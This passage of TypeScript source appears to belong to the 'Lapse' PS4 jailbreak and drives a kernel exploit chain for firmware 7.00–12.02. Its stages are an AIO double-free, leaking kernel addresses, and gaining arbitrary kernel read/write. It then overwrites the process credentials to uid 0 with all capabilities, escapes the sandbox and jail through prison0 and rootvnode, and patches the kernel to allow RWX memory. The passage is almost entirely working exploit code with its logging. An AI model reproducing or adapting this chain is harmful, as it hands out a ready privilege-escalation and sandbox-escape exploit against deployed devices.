    log('make_kernel_arw error: ' + (e as Error).message)
    log((e as Error).stack ?? '')
    return null
  }
}

export function lapse () {
  try {
    log('=== PS4 Lapse Jailbreak ===')

    FW_VERSION = get_fwversion()
    log('Detected PS4 firmware: ' + FW_VERSION)

    if (FW_VERSION === null) {
      log('Failed to detect PS4 firmware version.\nAborting...')
      send_notification('Failed to detect PS4 firmware version.\nAborting...')
      return false
    }

    const compare_version = (a: string, b: string) => {
      const a_arr = a.split('.')
      const amaj = Number(a_arr[0])
      const amin = Number(a_arr[1])
      const b_arr = b.split('.')
      const bmaj = Number(b_arr[0])
      const bmin = Number(b_arr[1])
      return amaj === bmaj ? amin - bmin : amaj - bmaj
    }

    if (compare_version(FW_VERSION, '7.00') < 0 || compare_version(FW_VERSION, '12.02') > 0) {
      log('Unsupported PS4 firmware\nSupported: 7.00-12.02\nAborting...')
      send_notification('Unsupported PS4 firmware\nAborting...')
      return false
    }

    kernel_offset = get_kernel_offset(FW_VERSION)
    log('Kernel offsets loaded for FW ' + FW_VERSION)

    // === STAGE 0: Setup ===
    log('=== STAGE 0: Setup ===')

    const setup_success = setup()
    if (!setup_success) {
      log('Setup failed')
      send_notification('Lapse: Setup failed')
      return false
    }
    log('Setup completed')

    log('')
    log('=== STAGE 1: Double-free AIO ===')

    sd_pair = double_free_reqs2()

    if (sd_pair === null) {
      log('[FAILED] Stage 1')
      send_notification('Lapse: FAILED at Stage 1')
      return false
    }
    log('Stage 1 completed')

    if (sds === null) {
      log('Failed to create socket list')
      send_notification('Lapse: FAILED at Stage 1 (sds creation)')
      return false
    }

    log('')
    log('=== STAGE 2: Leak kernel addresses ===')
    const leak_result = leak_kernel_addrs(sd_pair, sds)
    if (leak_result === null) {
      log('Stage 2 kernel address leak failed')
      cleanup_fail()
      return false
    }
    log('Stage 2 completed')
    log('Leaked addresses:')
    log('  reqs1_addr: ' + hex(leak_result.reqs1_addr))
    log('  kbuf_addr: ' + hex(leak_result.kbuf_addr))
    log('  kernel_addr: ' + hex(leak_result.kernel_addr))
    log('  target_id: ' + hex(leak_result.target_id))
    log('  fake_reqs3_addr: ' + hex(leak_result.fake_reqs3_addr))
    log('  aio_info_addr: ' + hex(leak_result.aio_info_addr))
    log('  evf: ' + hex(leak_result.evf))

    log('')
    log('=== STAGE 3: Double free SceKernelAioRWRequest ===')
    const pktopts_sds = double_free_reqs1(
      leak_result.reqs1_addr,
      leak_result.target_id,
      leak_result.evf,
      new BigInt(sd_pair[0]),
      sds!,
      sds_alt!,
      leak_result.fake_reqs3_addr
    )

    close(leak_result.fake_reqs3_sd!)

    if (pktopts_sds === null) {
      log('Stage 3 double free SceKernelAioRWRequest failed')
      cleanup_fail()
      return false
    }

    log('Stage 3 completed!')
    log('Aliased socket pair: ' + hex(pktopts_sds[0]) + ', ' + hex(pktopts_sds[1]))

    log('')
    log('=== STAGE 4: Get arbitrary kernel read/write ===')

    const arw_result = make_kernel_arw(
      pktopts_sds,
      leak_result.reqs1_addr,
      leak_result.kernel_addr,
      sds,
      sds_alt!,
      leak_result.aio_info_addr
    )

    if (arw_result === null) {
      log('Stage 4 get arbitrary kernel read/write failed')
      cleanup_fail()
      return false
    }

    log('Stage 4 completed!')

    log('')
    log('=== STAGE 5: Jailbreak ===')

    const OFFSET_P_UCRED = 0x40
    const proc = kernel.addr.curproc

    if (!proc || !kernel.addr.inside_kdata) {
      throw new Error('kernel addresses not initialized')
    }

    // Calculate kernel base
    kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
    log('Kernel base: ' + hex(kernel.addr.base))

    const uid_before = Number(getuid())
    const sandbox_before = Number(is_in_sandbox())
    log('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)

    // Patch ucred
    const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
    const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!

    kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
    kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
    kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
    kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
    kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid

    const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))!
    kernel.write_qword(ucred.add(0x30), prison0)

    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
    kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))

    const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))!
    kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
    kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir

    const uid_after = Number(getuid())
    const sandbox_after = Number(is_in_sandbox())
    log('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)

    if (uid_after === 0 && sandbox_after === 0) {
      log('Sandbox escape complete!')
    } else {
      log('[WARNING] Sandbox escape may have failed')
    }

    // === Apply kernel patches via kexec ===
    // Uses syscall_raw() which sets rax manually for syscalls without gadgets
    log('Applying kernel patches...')
    const kpatch_result = apply_kernel_patches(FW_VERSION)
    if (kpatch_result) {
      log('Kernel patches applied successfully!')

      // Comprehensive kernel patch verification
      log('Verifying kernel patches...')
      let all_patches_ok = true

      // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
      const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
      if (mmap_offsets) {
        const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]))
        const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]))
        const byte1 = Number(b1.and(0xff))
        const byte2 = Number(b2.and(0xff))
        if (byte1 === 0x37 && byte2 === 0x37) {
          log('  [OK] mmap RWX patch')
        } else {
          log('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(byte1) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(byte2))
          all_patches_ok = false
        }
      } else {
        log('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
      }

      // 2. Test mmap RWX actually works by trying to allocate RWX memory
      try {
        const PROT_RWX = 0x7  // READ | WRITE | EXEC
        const MAP_ANON = 0x1000
        const MAP_PRIVATE = 0x2
        const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
        if (Number(test_addr.shr(32)) < 0xffff8000) {
          log('  [OK] mmap RWX functional @ ' + hex(test_addr))
          // Unmap the test allocation
          munmap(test_addr, 0x1000)
        } else {
          log('  [FAIL] mmap RWX functional: ' + hex(test_addr))
          all_patches_ok = false
        }
      } catch (e) {
        log('  [FAIL] mmap RWX test error: ' + (e as Error).message)
        all_patches_ok = false
      }

      if (all_patches_ok) {
        log('All kernel patches verified OK!')
      } else {
        log('[WARNING] Some kernel patches may have failed')
      }
    } else {
      log('[WARNING] Kernel patches failed - continuing without patches')
    }

    log('Stage 5 completed - JAILBROKEN')
    // utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");

    cleanup()

    return true
  } catch (e) {
    log('Lapse error: ' + (e as Error).message)
    alert('Lapse error: ' + (e as Error).message)
    utils.notify('Reboot and try again!')
    log((e as Error).stack ?? '')
    return false
  }
}

function cleanup () {
  log('Performing cleanup...')

  try {
    if (block_fd !== 0xffffffff) {
      close(new BigInt(block_fd))
      block_fd = 0xffffffff
    }

    if (unblock_fd !== 0xffffffff) {
      close(new BigInt(unblock_fd))
      unblock_fd = 0xffffffff
    }

    if (typeof groom_ids !== 'undefined') {
      if (groom_ids !== null) {
        const groom_ids_addr = malloc(4 * NUM_GROOMS)
        for (let i = 0; i < NUM_GROOMS; i++) {
          write32(groom_ids_addr.add(i * 4), groom_ids[i]!)
        }
        free_aios2(groom_ids_addr, NUM_GROOMS)
        groom_ids = null
      }
    }

    if (block_id !== 0xffffffff) {
      const block_id_buf = malloc(4)
      write32(block_id_buf, block_id)
      const block_errors = malloc(4)
      aio_multi_wait_fun(block_id_buf, 1, block_errors, 1, 0)
      aio_multi_delete_fun(block_id_buf, 1, block_errors)
      block_id = 0xffffffff
    }

    if (sds !== null) {
      for (const sd of sds) {
        close(sd)
      }
      sds = null
    }

    if (sds_alt !== null) {
      for (const sd of sds_alt) {
        close(sd)
      }
      sds_alt = null
    }

    if (sd_pair !== null) {
      close(sd_pair[0])
      close(sd_pair[1])
    }
    sd_pair = null

    if (prev_core >= 0) {
      log('Restoring to previous core: ' + prev_core)
      pin_to_core(prev_core)
      prev_core = -1
    }

    set_rtprio(prev_rtprio)

    log('Cleanup completed')
  } catch (e) {
    log('Error during cleanup: ' + (e as Error).message)
  }
}

function cleanup_fail () {
  utils.notify('Lapse Failed! reboot and try again! UwU')
  jsmaf.root.children.push(bg_fail)
  cleanup()
}
